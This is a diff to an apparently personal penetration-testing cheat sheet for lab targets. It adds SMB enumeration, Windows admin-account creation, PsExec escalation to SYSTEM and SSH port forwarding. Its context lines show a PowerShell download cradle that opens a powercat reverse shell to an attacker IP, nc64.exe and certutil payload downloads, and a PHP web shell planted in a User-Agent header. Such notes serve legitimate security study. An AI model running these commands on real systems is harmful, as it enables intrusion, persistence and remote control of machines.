@@ -32,6 +32,9 @@ nmap -p$ports -sCSV 192.168.233.99 -v -oN nmap-services.log
 sudo nmap -sU --top-ports 100 192.168.233.99
 sudo nmap -Pn -n 192.168.233.99 -sU --top-ports=100 --reason
 
+# SMB enum
+sudo nmap -Pn -p139,445 -T4 --script "discovery and smb*" 192.168.233.99
+
 # SNMP enum
 sudo nmap -sU -p161 --script "*snmp*" 192.168.233.99
 
@@ -99,6 +102,8 @@ curl -X POST -d "username=admin&password=1234" http://192.168.233.99/login
 # 3. Capture Server Response Headers (Find Security Headers)
 # -I: Fetch headers only (HEAD request)
 curl -I http://192.168.233.99
+# show response header in output
+curl -i http://192.168.233.99
 
 # 4. Follow Redirects (Useful for Open Redirect Testing)
 # -L: Follow 3xx redirects
@@ -322,18 +327,28 @@ ffuf -u http://example.com/ -w /path/to/wordlist.txt -H "Host: FUZZ.example.com"
 ```
 #### Wfuzz
 ```bash
+## Parameter position matters
 # Directory fuzzing on a target URL
 wfuzz -c -w /path/to/wordlist.txt http://example.com/FUZZ
+
 # Fuzzing with different extensions
 wfuzz -c -w /path/to/wordlist.txt -z list,.php,.html,.txt http://example.com/FUZZ
+
 # Fuzz GET parameters
 wfuzz -c -w /path/to/wordlist.txt http://example.com/?param=FUZZ
+
 # Fuzz POST data
 wfuzz -c -w /path/to/wordlist.txt -d "param=FUZZ" http://example.com/
+
 # Filter results by response code
 wfuzz -c -w /path/to/wordlist.txt --hc 404 http://example.com/FUZZ
+
+# Filter results by number of char
+wfuzz -c -w /path/to/wordlist.txt --hh 60 http://example.com/FUZZ
+
 # Save results to a file
 wfuzz -c -w /path/to/wordlist.txt -o results.txt http://example.com/FUZZ
+
 # Use a proxy for fuzzing
 wfuzz -c -w /path/to/wordlist.txt -p 127.0.0.1:8080 http://example.com/FUZZ
 ```
@@ -468,6 +483,25 @@ uname -m OR arch
 
 i386 and i686 are both 32-bit.  
 x86_64 is 64-bit
+
+# Windows add existing user to the admin group
+net localgroup Administrators ariah /add 
+Add-LocalGroupMember -Group Administartors -Member ariah
+
+# To create a user in windows  
+net user balai Balai123! /add  
+  
+# To add to the administrator and RDP groups  
+net localgroup Administrators balai /add  
+net localgroup 'Remote Desktop Users' balai /add
+
+# Escalate to SYSTEM with PsExec.exe
+# Latest psexec tool https://download.sysinternals.com/files/PSTools.zip
+# Transfer tje psexec file
+scp ./PsExec64.exe USER@192.168.233.99:C:/Users/ariah/Downloads/psexec.exe
+# Then execute the command from elevated (administrator) terminal
+psexec.exe -accepteula -s cmd.exe
+# We can use the impacket-psexec command as well if we have smb access
 ```
 #### grep Command
 ```bash
@@ -507,6 +541,15 @@ cat /etc/passwd | grep bash
 # LFI and RFI
 powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.193:8080/powercat.ps1');powercat -c 192.168.45.193 -p 4443 -e cmd"
 
+### File transfer using SMB server
+impacket-smbserver share_name share_path -smb2support
+
+# Once setup download using in windows
+copy \\192.168.45.193\share\ignite.txt
+
+# To transfer the file from kali linux to the windows machine
+scp test.txt user@192.168.233.99:/C:/Temp
+
 # File transfer CMD
 powershell iwr http://192.168.45.193/nc64.exe -outfile nc64.exe
 
@@ -532,7 +575,9 @@ rdesktop 192.168.233.99
 certutil -urlcache -f http://192.168.45.193 path-output-file-name
 
 # windows RDP from linux using xfreerdp
-xfreerdp /v:IP /u:USER /p:PASSWORD /cert:ignore /dynamic-resolution
+xfreerdp /v:192.168.45.193 /u:USER /p:PASSWORD /cert:ignore /dynamic-resolution
+
+xfreerdp /cert:ignore /dynamic-resolution +clipboard /u:'user' /p:'password123!' /v:192.168.45.193
 
 # To check the privileges of the account
 whoami /priv
@@ -778,6 +823,17 @@ User-Agent: Mozilla/5.0 <?php echo system($_GET['cmd']); ?> (X11; Linux x86_64; 
 ```bash
 # SSH port forwarding (authenticated)
 ssh -L ATTACK_MACHINE_PORT:localhost:PORT vmdak@192.168.1.116
+
+# Password Authentication
+ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -f -N -L attack-ip:attack-port:remote-ip:remote-port user@target
+
+# Private Key Authentication
+ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -f -N -L attack-ip:attack-port:remote-ip:remote-port -i /path/to/private-key user@target
+	
+# Multiple Port Forward (as many -L as needed)
+ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -f -N -L attack-ip:attack-port:remote-ip:remote-port -L attack-ip:attack-port:remote-ip:remote-port user@target
+
+# https://notes.benheater.com/books/network-pivoting/page/port-forwarding-with-ssh#bkmrk-local-port-to-remote
 
 # Ligolo-ng setup
 sudo ip tuntap add user kali mode tun ligolo
